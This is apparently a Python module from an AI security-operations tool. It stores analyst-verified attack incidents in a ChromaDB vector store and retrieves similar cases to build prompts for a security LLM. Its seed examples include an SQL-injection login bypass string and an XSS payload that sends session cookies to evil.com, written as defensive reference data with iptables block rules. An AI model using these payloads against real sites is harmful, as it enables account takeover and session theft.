"""
ChromaDB Vector Memory & Few-Shot RAG Engine.
Stores verified analyst incidents and retrieves semantically similar historical attacks
to feed into Tier 2 Cisco LLM prompt without requiring expensive fine-tuning.
"""

import json
import logging
from pathlib import Path
from typing import Any, Dict, List, Optional
import chromadb
from chromadb.config import Settings as ChromaSettings

from config.settings import settings
from schemas.events import ThreatAnalysisResult, ThreatSeverity

logger = logging.getLogger("AI_SOC.VectorStore")


class VectorMemory:
    def __init__(self, persist_dir: Optional[Path] = None):
        self.persist_dir = persist_dir or settings.CHROMA_PERSIST_DIR
        self.persist_dir.mkdir(parents=True, exist_ok=True)

        self.client = chromadb.PersistentClient(
            path=str(self.persist_dir),
            settings=ChromaSettings(anonymized_telemetry=False)
        )
        self.collection = self.client.get_or_create_collection(
            name=settings.CHROMA_COLLECTION_NAME,
            metadata={"description": "Verified AI-SOC incident memory"}
        )

        self._seed_initial_knowledge_if_empty()

    def _seed_initial_knowledge_if_empty(self):
        """Populates baseline cybersecurity knowledge base if store is empty."""
        try:
            if self.collection.count() == 0:
                seeds = [
                    {
                        "id": "seed-sqli-01",
                        "document": "GET /login.php?user=admin%27+OR+%271%27=%271 HTTP/1.1",
                        "metadata": {
                            "attack_type": "SQL Injection",
                            "severity": "Critical",
                            "mitre_id": "T1190",
                            "summary": "Kimlik doğrulama bypass amaçlı SQL Injection denemesi.",
                            "mitigation_command": "iptables -I INPUT -s 185.220.101.5 -p tcp --dport 80 -j DROP"
                        }
                    },
                    {
                        "id": "seed-xss-01",
                        "document": "POST /guestbook?author=%3Cscript%3Edocument.location=http://evil.com/cookie%3C/script%3E",
                        "metadata": {
                            "attack_type": "Cross-Site Scripting (XSS)",
                            "severity": "High",
                            "mitre_id": "T1189",
                            "summary": "Oturum çerezlerini hedef alan yansıtılmış Stored XSS saldırısı.",
                            "mitigation_command": "iptables -I INPUT -s 45.142.120.19 -p tcp --dport 443 -j DROP"
                        }
                    },
                    {
                        "id": "seed-ssh-01",
                        "document": "sshd[18421]: Failed password for invalid user root from 194.26.29.112 port 54122 ssh2",
                        "metadata": {
                            "attack_type": "SSH Brute Force",
                            "severity": "High",
                            "mitre_id": "T1110.001",
                            "summary": "Root hesabına yönelik parola tahmin ve kaba kuvvet saldırısı.",
                            "mitigation_command": "iptables -I INPUT -s 194.26.29.112 -p tcp --dport 22 -j DROP"
                        }
                    }
                ]

                self.collection.add(
                    ids=[s["id"] for s in seeds],
                    documents=[s["document"] for s in seeds],
                    metadatas=[s["metadata"] for s in seeds]
                )
                logger.info("ChromaDB vector memory initialized with 3 baseline cybersecurity incidents.")
        except Exception as e:
            logger.warning(f"Failed to seed vector memory: {e}")

    def store_verified_incident(self, log_id: str, raw_log: str, result: ThreatAnalysisResult):
        """Stores a verified incident in ChromaDB for future few-shot retrieval."""
        try:
            doc_id = f"incident-{log_id}"
            metadata = {
                "attack_type": str(result.attack_type),
                "severity": str(result.severity.value if hasattr(result.severity, "value") else result.severity),
                "mitre_id": str(result.mitre_id),
                "summary": str(result.summary),
                "mitigation_command": str(result.mitigation_command),
            }
            self.collection.upsert(
                ids=[doc_id],
                documents=[raw_log],
                metadatas=[metadata]
            )
            logger.info(f"Learned incident {doc_id} into ChromaDB memory.")
        except Exception as e:
            logger.error(f"Error persisting incident to ChromaDB: {e}")

    def retrieve_similar_cases(self, query_text: str, top_k: int = 2) -> List[Dict[str, Any]]:
        """Retrieves top_k most semantically relevant historical cases for RAG prompt augmentation."""
        try:
            if self.collection.count() == 0:
                return []
            k = min(top_k, self.collection.count())
            results = self.collection.query(
                query_texts=[query_text],
                n_results=k
            )
            cases = []
            if results and results.get("metadatas") and len(results["metadatas"]) > 0:
                for idx, meta in enumerate(results["metadatas"][0]):
                    doc = results["documents"][0][idx] if results.get("documents") else ""
                    cases.append({
                        "raw_sample": doc,
                        "attack_type": meta.get("attack_type", "Unknown"),
                        "severity": meta.get("severity", "Medium"),
                        "mitre_id": meta.get("mitre_id", "T1000"),
                        "summary": meta.get("summary", ""),
                        "mitigation_command": meta.get("mitigation_command", "")
                    })
            return cases
        except Exception as e:
            logger.warning(f"RAG query error in ChromaDB: {e}")
            return []

    def get_total_memory_count(self) -> int:
        """Returns total verified incident cases stored in vector memory."""
        try:
            return self.collection.count()
        except Exception:
            return 0

    def store_negative_example(self, log_id: str, raw_log: str, analyst_note: str = "False Positive"):
        """Stores a false positive as a negative example to prevent future misclassification."""
        try:
            doc_id = f"fp-{log_id}"
            metadata = {
                "attack_type": "FALSE_POSITIVE",
                "severity": "None",
                "mitre_id": "N/A",
                "summary": analyst_note,
                "mitigation_command": "N/A",
            }
            self.collection.upsert(
                ids=[doc_id],
                documents=[raw_log],
                metadatas=[metadata]
            )
            logger.info(f"Stored false positive negative example {doc_id} into ChromaDB memory.")
        except Exception as e:
            logger.error(f"Error persisting negative example to ChromaDB: {e}")

    def reset_memory(self):
        """Clears all learned records and restores clean baseline seed incidents."""
        try:
            self.client.delete_collection(name=settings.CHROMA_COLLECTION_NAME)
        except Exception:
            pass
        self.collection = self.client.get_or_create_collection(
            name=settings.CHROMA_COLLECTION_NAME,
            metadata={"description": "Verified AI-SOC incident memory"}
        )
        self._seed_initial_knowledge_if_empty()
        logger.info("ChromaDB vector memory has been reset to baseline seeds.")
